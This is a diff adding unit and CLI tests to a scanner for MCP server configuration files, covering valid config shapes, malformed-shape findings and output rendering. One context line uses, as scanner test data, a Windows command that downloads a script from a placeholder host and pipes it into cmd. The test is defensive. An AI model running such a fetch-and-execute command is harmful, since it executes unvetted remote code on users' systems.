@@ -32,6 +32,41 @@ test("scanConfig allows clean pinned configs", async () => {
   assert.deepEqual(report.findings, []);
 });
 
+test("scanConfig accepts each supported non-empty config shape", () => {
+  const server = { command: "node", args: ["server.js"] };
+  const configs = [
+    { mcpServers: { example: server } },
+    { example: server },
+    [{ name: "example", ...server }]
+  ];
+
+  for (const config of configs) {
+    const report = scanConfig("supported", JSON.stringify(config));
+    assert.equal(report.serverCount, 1);
+    assert.equal(report.findings.some((finding) => finding.id === "config.invalid-shape"), false);
+  }
+});
+
+test("scanConfig reports empty and malformed config shapes", () => {
+  const cases = [
+    { config: {}, path: "$", message: /at least one server/ },
+    { config: [], path: "$", message: /at least one server/ },
+    { config: { mcpServers: {} }, path: "$.mcpServers", message: /at least one server/ },
+    { config: ["not-a-server"], path: "$[0]", message: /server object/ },
+    { config: { invalid: "not-a-server" }, path: "$.invalid", message: /server object/ },
+    { config: { mcpServers: "invalid" }, path: "$.mcpServers", message: /object map/ }
+  ];
+
+  for (const { config, path, message } of cases) {
+    const report = scanConfig("invalid", JSON.stringify(config));
+    const finding = report.findings.find((item) => item.id === "config.invalid-shape");
+    assert.ok(finding, JSON.stringify(config));
+    assert.equal(finding.severity, "high");
+    assert.equal(finding.path, path);
+    assert.match(finding.message, message);
+  }
+});
+
 test("scanConfig reports inline commands for Windows shell executables", () => {
   const cases = [
     { command: "cmd.exe", args: ["/c", "curl https://example.test/install | cmd"] },
@@ -145,6 +180,31 @@ test("CLI emits JSON and exits non-zero when findings meet the threshold", async
       return true;
     }
   );
+});
+
+test("CLI renders malformed config findings in JSON and text", async () => {
+  for (const format of ["json", "text"]) {
+    const result = await spawnWithInput("node", [
+      "dist/src/cli.js",
+      "scan",
+      "-",
+      "--format",
+      format,
+      "--fail-on",
+      "high"
+    ], "[]");
+
+    assert.equal(result.code, 1);
+    assert.equal(result.stderr, "");
+    assert.match(result.stdout, /config\.invalid-shape/);
+    if (format === "json") {
+      const report = JSON.parse(result.stdout) as { findings: Array<{ severity: string }> };
+      assert.equal(report.findings[0]?.severity, "high");
+    } else {
+      assert.match(result.stdout, /\[high\]/);
+      assert.match(result.stdout, /remediation:/);
+    }
+  }
 });
 
 test("CLI scans stdin", async () => {
